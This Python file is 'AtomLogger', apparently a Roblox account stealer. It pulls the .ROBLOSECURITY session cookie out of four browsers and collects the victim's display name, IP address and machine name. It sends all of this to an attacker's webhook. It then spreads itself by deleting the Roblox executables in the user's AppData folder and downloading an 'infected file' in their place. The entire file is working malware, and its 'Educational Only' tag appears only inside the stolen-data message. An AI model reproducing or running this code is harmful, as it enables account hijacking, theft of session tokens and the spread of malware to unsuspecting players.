import browser_cookie3, requests, urllib, re, os

#   Settings - Webhook    #
webhook = 'WEBHOOK URL HERE'
avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
botName = 'AtomLogger | ROBLOX'
#   Settings - Self Spread    #
fileLink = 'INFECTED FILE URL HERE'

#   Functions   #
def sendWebhook(message):
    requests.post(webhook, data = f'username={botName}&avatar_url={avatarUrl}&content={message}', headers = {'content-type':"application/x-www-form-urlencoded"})

def scrapeInfo(cookies):
    request = requests.get('https://www.roblox.com', cookies=cookies)
    displayName = re.findall("displayname=(.*) data-isunder13", request.content.decode('UTF-8'))
    return displayName[0]

def getIPAddress():
    request = requests.get('https://ip4.seeip.org/')
    return request.content.decode('UTF-8')

def downloadFile(downloadFile, path):
    urllib.request.urlretrieve(downloadFile, path)

def selfSpread():
    path = os.getenv('LOCALAPPDATA') + '\\Roblox\\Versions'
    if os.path.isdir(path):
        for file in os.listdir(path):       # For every file in "Appdata/Local/Roblox/Versions"
                if os.path.isdir(path + f'\\{file}'):       # If a path is directory
                    path += f'\\{file}'     # Adding the directory to the path
                    for file in os.listdir(path):       # For every file in the new directory
                        if file.endswith('.exe'):       # If file ends with .exe
                            if os.path.getsize(path + '\\RobloxPlayerLauncher.exe') < 5242880 or os.path.getsize(path + '\\RobloxPlayerBeta.exe') > 31457280: # 5242880 -> 5MB, 31457280 -> 30MB
                                exePath = path + f'\\{file}'        # Adding the file to the path
                                os.remove(exePath)      # Removing the file
                                downloadFile(fileLink, exePath)       # Downloading the infected files // When opening Roblox it'll open the infected file.
                else:
                    continue

def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:


        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

def AtomLogger():
    cookies = cookieLogger()

    machineName = os.getenv('COMPUTERNAME')

    message = '```' + 'AtomLogger | Educational Only\n'
    message += f'\nName: {scrapeInfo(cookies[0])} \nCookie:\n{cookies[1]} \n\nMachine Name: {machineName} \nIP Address: {getIPAddress()}' + '```'
    sendWebhook(message)


if __name__ == '__main__':
    AtomLogger()
    selfSpread()